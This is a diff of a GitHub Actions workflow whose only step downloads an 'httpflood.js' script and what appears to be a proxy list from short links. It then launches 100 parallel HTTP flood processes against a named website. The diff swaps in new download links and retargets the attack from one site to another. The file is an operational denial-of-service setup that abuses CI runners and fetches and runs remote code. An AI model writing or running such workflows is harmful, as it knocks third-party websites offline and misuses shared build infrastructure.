@@ -15,13 +15,13 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/NPJJ7/httpflood.js
-          wget https://curl.by/UYgdD/fres.txt
+          wget https://curl.by/rmXO-/httpflood.js
+          wget https://curl.by/A3c4J/fres.txt
           npm install fake-useragent colors
           chmod +x httpflood.js
           PIDS=()
           for i in {1..100}; do
-            timeout 85 node httpflood.js GET https://hexbear.xyz/ fres.txt 83 90 12
+            timeout 85 node httpflood.js GET https://antiddos.ooguy.com/ fres.txt 83 90 12
             PIDS+=($!)
           done
           
